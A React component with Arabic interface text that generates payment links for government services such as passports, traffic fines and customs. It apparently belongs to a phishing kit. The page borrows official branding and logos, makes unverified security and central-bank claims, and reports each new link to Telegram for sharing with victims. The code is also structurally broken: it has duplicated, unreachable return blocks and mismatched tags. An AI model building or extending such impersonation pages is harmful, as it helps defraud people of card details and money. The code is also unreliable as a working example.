import React, { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getGovernmentServiceByKey, getGovernmentServicesByCountry } from "@/lib/governmentPaymentServices";
import { getCurrencyCode } from "@/lib/countryCurrencies";
import { 
  Copy,
  ExternalLink,
  CheckCircle,
  Shield,
  Lock,
  Link as LinkIcon,
  Landmark
} from "lucide-react";
import BackButton from "@/components/BackButton";
import { sendToTelegram } from "@/lib/telegram";
import SEOHead from "@/components/SEOHead";

const GovernmentPaymentLinkCreator = () => {
  const { country, serviceKey } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  
  const [selectedService, setSelectedService] = useState(serviceKey || '');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [createdLink, setCreatedLink] = useState("");
  const [showSuccess, setShowSuccess] = useState(false);

  const govSystem = useMemo(() => getGovernmentPaymentSystem(country || 'SA'), [country]);
  const governmentServices = useMemo(() => getGovernmentServicesByCountry(country || 'SA'), [country]);
  const selectedServiceData = useMemo(
    () => getGovernmentServiceByKey(selectedService),
    [selectedService]
  );

  const primaryColor = govSystem.colors.primary;

  const handleCreateLink = async () => {
    if (!selectedService || !selectedServiceData) {
      toast({
        title: "تنبيه",
        description: "الرجاء اختيار الخدمة أولاً",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      const link = await createLink.mutateAsync({
        type: "government",
        country_code: country || selectedServiceData.country,
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData.nameAr,
          payment_amount: 0,
          currency_code: getCurrencyCode(country || selectedServiceData.country),
          provider: selectedServiceData.key.toUpperCase(),
          selectedCountry: country || selectedServiceData.country,
          payment_method: "card",
        },
      });

      const baseUrl = typeof window !== 'undefined'
        ? window.location.origin
        : (import.meta.env.VITE_PRODUCTION_DOMAIN || 'https://glittering-eclair-9e77e0.netlify.app');
      
      const currencyCode = getCurrencyCode(country || selectedServiceData.country);
      const queryParams = new URLSearchParams({
        service: selectedService,
        country: country || selectedServiceData.country,
        currency: currencyCode,
        provider: selectedServiceData.key.toUpperCase()
      }).toString();
      
      const paymentUrl = `${baseUrl}/pay/${link.id}?${queryParams}`;

      setCreatedLink(paymentUrl);
      setShowSuccess(true);

      await sendToTelegram({
        type: 'payment_link_created',
        data: {
          service: selectedServiceData.nameAr,
          country: country || selectedServiceData.country,
          payment_url: paymentUrl,
        },
        timestamp: new Date().toISOString(),
      });

      toast({
        title: "✅ تم إنشاء رابط الدفع بنجاح",
        description: "يمكنك الآن نسخ الرابط أو معاينته",
      });
    } catch (error) {
      console.error("Error creating payment link:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء إنشاء رابط الدفع",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdLink);
    toast({
      title: "✅ تم النسخ",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };

  const handlePreview = () => {
    window.open(createdLink, '_blank');
  };

  if (showSuccess) {
    return (
      <>
        <SEOHead 
          title={`تم إنشاء رابط ${selectedServiceData?.nameAr} - ${govSystem.nameAr}`}
          description={`رابط دفع آمن لخدمة ${selectedServiceData?.nameAr} عبر نظام ${govSystem.nameAr}`}
          image="/og-government_payment.jpg"
          type="website"
        />
        <div 
          className="min-h-screen flex items-center justify-center py-8 px-4"
          style={{
            background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
            fontFamily: govSystem.fonts.primaryAr
          }}
          dir="rtl"
        >
          <Card 
            className="max-w-2xl w-full overflow-hidden border-0 shadow-2xl"
            style={{ borderRadius: govSystem.borderRadius.lg }}
          >
            <div 
              className="p-8 text-center"
              style={{
                background: govSystem.gradients.header,
              }}
            >
              <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-white/20 backdrop-blur-sm flex items-center justify-center">
                <CheckCircle className="w-12 h-12 text-white" />
              </div>
              <h2 className="text-3xl font-bold text-white mb-2">
                تم إنشاء رابط الدفع بنجاح
              </h2>
              <p className="text-white/90">
                يمكنك الآن مشاركة الرابط مع العميل
              </p>
            </div>

            <div className="p-8 space-y-6">
              <div 
                className="p-6 rounded-xl border-2"
                style={{
                  borderColor: primaryColor,
                  background: `${primaryColor}08`
                }}
              >
                <div className="text-sm font-semibold mb-2">
                  رابط الدفع
                </div>
                <div className="bg-white p-4 rounded-lg break-all text-sm font-mono border">
                  {createdLink}
                </div>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <Button
                  onClick={handleCopyLink}
                  size="lg"
                  className="w-full"
                  style={{
                    background: govSystem.gradients.primary,
                    color: govSystem.colors.textOnPrimary
                  }}
                >
                  <Copy className="w-5 h-5 ml-2" />
                  نسخ الرابط
                </Button>
                <Button
                  onClick={handlePreview}
                  size="lg"
                  variant="outline"
                  className="w-full"
                  style={{
                    borderColor: primaryColor,
                    color: primaryColor
                  }}
                >
                  <ExternalLink className="w-5 h-5 ml-2" />
                  معاينة الرابط
                </Button>
              </div>

              <Button
                onClick={() => window.location.href = '/services'}
                size="lg"
                variant="ghost"
                className="w-full"
              >
                العودة للخدمات
              </Button>
            </div>
          </Card>
        </div>
      </>
    );
  }

  return (
    <>
      <SEOHead 
        title={`${govSystem.nameAr} - السداد الحكومي`}
        description={`إنشاء روابط دفع آمنة للخدمات الحكومية عبر ${govSystem.nameAr} - جواز السفر، المخالفات المرورية، رخصة القيادة والمزيد`}
        image="/og-government_payment.jpg"
        type="website"
      />
      
      <div 
        className="min-h-screen py-8 px-4"
        style={{
          background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
          fontFamily: govSystem.fonts.primaryAr
        }}
        dir="rtl"
      >
        <div className="container mx-auto max-w-3xl">
          <div className="mb-6">
            <BackButton />
          </div>

          <Card 
            className="overflow-hidden border-0 shadow-2xl"
            style={{ borderRadius: govSystem.borderRadius.lg }}
          >
            <div 
              className="p-6 sm:p-8 text-center"
              style={{
                background: govSystem.gradients.header,
              }}
            >
              <div className="flex items-center justify-center gap-4 mb-4">
                {govSystem.logo && (
                  <div className="bg-white p-3 rounded-xl">
                    <img 
                      src={govSystem.logo} 
                      alt={govSystem.nameAr}
                      className="h-12 sm:h-14 w-auto object-contain"
                    />
                  </div>
                )}
              </div>
              <h1 className="text-2xl sm:text-3xl font-bold text-white mb-2">
                {govSystem.nameAr}
              </h1>
              <p className="text-white/90 text-sm sm:text-base">
                إنشاء رابط دفع للخدمات الحكومية
              </p>
            </div>

            <div className="p-6 sm:p-8 space-y-6">
              <div>
                <Label className="text-base font-bold mb-3 block" style={{ color: govSystem.colors.text }}>
                  اختر الخدمة الحكومية *
                </Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger 
                    className="h-12 border-2 text-base"
                    style={{
                      borderColor: govSystem.colors.border,
                      fontFamily: govSystem.fonts.primaryAr
                    }}
                  >
                    <SelectValue placeholder="اختر الخدمة..." />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50 max-h-[400px]">
                    {governmentServices.map((service) => (
                      <SelectItem key={service.id} value={service.key} className="text-base py-3">
                        <div>
                          <div className="font-bold">{service.nameAr}</div>
                          {service.description && (
                            <div className="text-xs text-muted-foreground">{service.description}</div>
                          )}
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {selectedServiceData && (
                  <div 
                    className="mt-3 p-3 rounded-lg"
                    style={{
                      background: `${primaryColor}08`,
                      borderRight: `3px solid ${primaryColor}`
                    }}
                  >
                    <p className="text-sm font-semibold" style={{ color: primaryColor }}>
                      ✓ {selectedServiceData.nameAr}
                    </p>
                    <p className="text-xs text-gray-600 mt-1">
                      {selectedServiceData.description}
                    </p>
                  </div>
                )}
              </div>

              <div 
                className="p-4 rounded-lg"
                style={{
                  background: `${primaryColor}08`,
                  borderRight: `4px solid ${primaryColor}`
                }}
              >
                <div className="flex items-start gap-3">
                  <Shield className="w-5 h-5 mt-0.5" style={{ color: primaryColor }} />
                  <div className="flex-1">
                    <p className="text-sm font-semibold mb-1" style={{ color: primaryColor }}>
                      معاملة آمنة ومشفرة
                    </p>
                    <p className="text-xs text-gray-600">
                      جميع البيانات محمية بتقنية التشفير SSL ومعتمدة من البنك المركزي
                    </p>
                  </div>
                </div>
              </div>

              <Button
                onClick={handleCreateLink}
                disabled={isSubmitting || !selectedService}
                className="w-full h-14 text-lg font-bold text-white shadow-2xl hover:shadow-3xl transition-all duration-300 disabled:opacity-50"
                style={{
                  background: govSystem.gradients.primary,
                  boxShadow: govSystem.shadows.xl
                }}
              >
                {isSubmitting ? (
                  "جاري إنشاء الرابط..."
                ) : (
                  <>
                    <LinkIcon className="w-5 h-5 ml-2" />
                    إنشاء رابط الدفع
                  </>
                )}
              </Button>

              <div className="pt-4 border-t">
                <h3 className="font-bold text-lg mb-3" style={{ color: govSystem.colors.text }}>
                  الخدمات المتاحة في {govSystem.nameAr}
                </h3>
                <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
                  {[
                    '🛂 جواز السفر',
                    '🚗 المخالفات المرورية',
                    '🪪 رخصة القيادة',
                    '🏛️ الخدمات البلدية',
                    '📄 العقود',
                    '🆔 بطاقة الأحوال',
                    '🎓 الخدمات التعليمية',
                    '🏥 الخدمات الصحية',
                    '💼 تصاريح العمل',
                    '🛡️ التأمين',
                    '🚙 استمارة المركبة',
                    '📦 الجمارك'
                  ].map((service, index) => (
                    <div 
                      key={index}
                      className="p-2 rounded-lg text-center text-xs font-semibold"
                      style={{
                        background: `${primaryColor}05`,
                        color: govSystem.colors.text
                      }}
                    >
                      {service}
                    </div>
                  ))}
                </div>
              </div>

              <div className="pt-4 border-t">
                <h3 className="font-bold text-base mb-3" style={{ color: govSystem.colors.text }}>
                  إرشادات الدفع
                </h3>
                <ul className="space-y-2 text-sm text-gray-700">
                  <li className="flex items-center gap-2">
                    <Shield className="w-4 h-4" style={{ color: primaryColor }} />
                    جميع المعاملات محمية بأعلى معايير الأمان
                  </li>
                  <li className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4" style={{ color: primaryColor }} />
                    تأكيد فوري بعد إتمام الدفع
                  </li>
                  <li className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4" style={{ color: primaryColor }} />
                    إمكانية طباعة إيصال الدفع
                  </li>
                  <li className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4" style={{ color: primaryColor }} />
                    دعم جميع وسائل الدفع الإلكتروني
                  </li>
                </ul>
              </div>
            </div>

            <div 
              className="px-8 py-4 text-center text-xs"
              style={{
                background: govSystem.colors.surface,
                borderTop: `1px solid ${govSystem.colors.border}`
              }}
            >
              <div className="flex items-center justify-center gap-4 text-gray-500">
                <div className="flex items-center gap-1">
                  <Lock className="w-3 h-3" />
                  <span>SSL Encrypted</span>
                </div>
                <span>•</span>
                <div className="flex items-center gap-1">
                  <Shield className="w-3 h-3" />
                  <span>PCI Compliant</span>
                </div>
              </div>
            </div>
          </Card>

          {showSuccess && (
            <Card 
              className="mt-6 overflow-hidden border-0 shadow-2xl"
              style={{ borderRadius: govSystem.borderRadius.lg }}
            >
              <div 
                className="p-8 text-center"
                style={{
                  background: govSystem.gradients.header,
                }}
              >
                <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-white/20 backdrop-blur-sm flex items-center justify-center">
                  <CheckCircle className="w-12 h-12 text-white" />
                </div>
                <h2 className="text-3xl font-bold text-white mb-2">
                  تم إنشاء رابط الدفع بنجاح
                </h2>
                <p className="text-white/90">
                  يمكنك الآن مشاركة الرابط مع العميل
                </p>
              </div>

              <div className="p-8 space-y-6">
                <div 
                  className="p-6 rounded-xl border-2"
                  style={{
                    borderColor: primaryColor,
                    background: `${primaryColor}08`
                  }}
                >
                  <div className="text-sm font-semibold mb-2">
                    رابط الدفع
                  </div>
                  <div className="bg-white p-4 rounded-lg break-all text-sm font-mono border">
                    {createdLink}
                  </div>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <Button
                    onClick={handleCopyLink}
                    size="lg"
                    className="w-full"
                    style={{
                      background: govSystem.gradients.primary,
                      color: govSystem.colors.textOnPrimary
                    }}
                  >
                    <Copy className="w-5 h-5 ml-2" />
                    نسخ الرابط
                  </Button>
                  <Button
                    onClick={handlePreview}
                    size="lg"
                    variant="outline"
                    className="w-full"
                    style={{
                      borderColor: primaryColor,
                      color: primaryColor
                    }}
                  >
                    <ExternalLink className="w-5 h-5 ml-2" />
                    معاينة الرابط
                  </Button>
                </div>

                <Button
                  onClick={() => {
                    setShowSuccess(false);
                    setCreatedLink("");
                    setSelectedService("");
                  }}
                  size="lg"
                  variant="secondary"
                  className="w-full"
                >
                  إنشاء رابط جديد
                </Button>

                <Button
                  onClick={() => window.location.href = '/services'}
                  size="lg"
                  variant="ghost"
                  className="w-full"
                >
                  العودة للخدمات
                </Button>
              </div>
            </Card>
          )}
        </div>
      </>
    );
  }

  return (
    <>
      <SEOHead 
        title={`${govSystem.nameAr} - السداد الحكومي`}
        description={`إنشاء روابط دفع آمنة للخدمات الحكومية عبر ${govSystem.nameAr}`}
        image="/og-government_payment.jpg"
        type="website"
      />
      
      <div 
        className="min-h-screen py-8 px-4"
        style={{
          background: `linear-gradient(135deg, ${govSystem.colors.surface}, #FFFFFF)`,
          fontFamily: govSystem.fonts.primaryAr
        }}
        dir="rtl"
      >
        <div className="container mx-auto max-w-3xl">
          <div className="mb-6">
            <BackButton />
          </div>

          <Card 
            className="overflow-hidden border-0 shadow-2xl"
            style={{ borderRadius: govSystem.borderRadius.lg }}
          >
            <div 
              className="p-6 sm:p-8 text-center"
              style={{
                background: govSystem.gradients.header,
              }}
            >
              <div className="flex items-center justify-center gap-4 mb-4">
                {govSystem.logo && (
                  <div className="bg-white p-3 rounded-xl">
                    <img 
                      src={govSystem.logo} 
                      alt={govSystem.nameAr}
                      className="h-12 sm:h-14 w-auto object-contain"
                    />
                  </div>
                )}
              </div>
              <h1 className="text-2xl sm:text-3xl font-bold text-white mb-2">
                {govSystem.nameAr}
              </h1>
              <p className="text-white/90 text-sm sm:text-base">
                إنشاء رابط دفع للخدمات الحكومية
              </p>
            </div>

            <div className="p-6 sm:p-8 space-y-6">
              <div>
                <Label className="text-base font-bold mb-3 block" style={{ color: govSystem.colors.text }}>
                  اختر الخدمة الحكومية *
                </Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger 
                    className="h-12 border-2 text-base"
                    style={{
                      borderColor: govSystem.colors.border,
                      fontFamily: govSystem.fonts.primaryAr
                    }}
                  >
                    <SelectValue placeholder="اختر الخدمة..." />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50 max-h-[400px]">
                    {governmentServices.map((service) => (
                      <SelectItem key={service.id} value={service.key} className="text-base py-3">
                        <div>
                          <div className="font-bold">{service.nameAr}</div>
                          {service.description && (
                            <div className="text-xs text-muted-foreground">{service.description}</div>
                          )}
                        </div>
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
                {selectedServiceData && (
                  <div 
                    className="mt-3 p-3 rounded-lg"
                    style={{
                      background: `${primaryColor}08`,
                      borderRight: `3px solid ${primaryColor}`
                    }}
                  >
                    <p className="text-sm font-semibold" style={{ color: primaryColor }}>
                      ✓ {selectedServiceData.nameAr}
                    </p>
                    <p className="text-xs text-gray-600 mt-1">
                      {selectedServiceData.description}
                    </p>
                  </div>
                )}
              </div>

              <div 
                className="p-4 rounded-lg"
                style={{
                  background: `${primaryColor}08`,
                  borderRight: `4px solid ${primaryColor}`
                }}
              >
                <div className="flex items-start gap-3">
                  <Shield className="w-5 h-5 mt-0.5" style={{ color: primaryColor }} />
                  <div className="flex-1">
                    <p className="text-sm font-semibold mb-1" style={{ color: primaryColor }}>
                      معاملة آمنة ومشفرة
                    </p>
                    <p className="text-xs text-gray-600">
                      جميع البيانات محمية بتقنية التشفير SSL ومعتمدة من البنك المركزي
                    </p>
                  </div>
                </div>
              </div>

              <Button
                onClick={handleCreateLink}
                disabled={isSubmitting || !selectedService}
                className="w-full h-14 text-lg font-bold text-white shadow-2xl hover:shadow-3xl transition-all duration-300"
                style={{
                  background: govSystem.gradients.primary,
                  boxShadow: govSystem.shadows.xl
                }}
              >
                {isSubmitting ? (
                  "جاري إنشاء الرابط..."
                ) : (
                  <>
                    <LinkIcon className="w-5 h-5 ml-2" />
                    إنشاء رابط الدفع
                  </>
                )}
              </Button>

              <div className="pt-4 border-t">
                <h3 className="font-bold text-base mb-3" style={{ color: govSystem.colors.text }}>
                  الخدمات المتاحة
                </h3>
                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                  {[
                    '🛂 جواز السفر',
                    '🚗 المخالفات',
                    '🪪 رخصة القيادة',
                    '🏛️ البلدية',
                    '📄 العقود',
                    '🆔 الأحوال',
                    '🎓 التعليم',
                    '🏥 الصحة',
                    '💼 العمل',
                    '🛡️ التأمين',
                    '🚙 الاستمارة',
                    '📦 الجمارك'
                  ].map((service, index) => (
                    <div 
                      key={index}
                      className="p-2 rounded-lg text-center text-xs font-semibold"
                      style={{
                        background: `${primaryColor}05`,
                        color: govSystem.colors.text
                      }}
                    >
                      {service}
                    </div>
                  ))}
                </div>
              </div>
            </div>

            <div 
              className="px-8 py-4 text-center text-xs"
              style={{
                background: govSystem.colors.surface,
                borderTop: `1px solid ${govSystem.colors.border}`
              }}
            >
              <div className="flex items-center justify-center gap-4 text-gray-500">
                <div className="flex items-center gap-1">
                  <Lock className="w-3 h-3" />
                  <span>SSL Encrypted</span>
                </div>
                <span>•</span>
                <div className="flex items-center gap-1">
                  <Shield className="w-3 h-3" />
                  <span>PCI Compliant</span>
                </div>
              </div>
            </div>
          </Card>
        </div>
      </div>
    </>
  );
};

export default GovernmentPaymentLinkCreator;
